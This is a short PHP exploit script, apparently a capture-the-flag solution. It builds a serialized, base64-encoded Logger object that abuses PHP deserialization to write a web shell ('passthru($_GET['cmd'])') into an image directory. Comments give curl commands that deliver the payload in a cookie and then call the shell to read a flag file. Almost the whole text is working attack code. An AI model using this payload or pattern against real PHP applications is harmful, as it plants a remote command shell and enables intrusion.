<?php
class Logger
{
    private $logFile;
    private $iniMsg;
    private $exitMsg;

    function __construct()
    {
        $this->iniMsg = '';
        $this->exitMsg = "<?php passthru(\$_GET['cmd']); ?>";
        $this->logFile = '/path/img/webshell.php';
    }
}

$obj = new Logger();

$serialized = serialize($obj);

$payload = base64_encode($serialized);

echo $payload;
// curl -u user:password -b "drawing=$payload" http://localhost/
// curl -u user:password http://localhost/img/webshell.php?cmd=head%20/pathflag
?>
